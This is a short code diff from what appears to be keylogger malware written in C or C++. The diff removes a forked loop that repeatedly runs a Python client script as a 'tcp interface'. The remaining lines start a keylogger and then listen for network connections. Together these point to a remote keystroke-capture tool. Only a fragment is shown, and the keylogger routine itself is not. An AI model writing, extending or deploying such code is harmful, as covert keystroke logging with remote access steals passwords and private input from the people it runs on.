@@ -45,15 +45,6 @@ int main()
 
 	struct sockaddr_in connDef;
 	socklen_t connDefLn = sizeof(connDef);
-	// launch tcp interface
-	pid_t pid = fork();
-	if (pid == 0)
-	{
-		while(true)
-		{
-			system("python3.5 client.py");
-		}
-	}
 	// launch keylogger 
 	startKeyLogger();
 	// start listening for connection
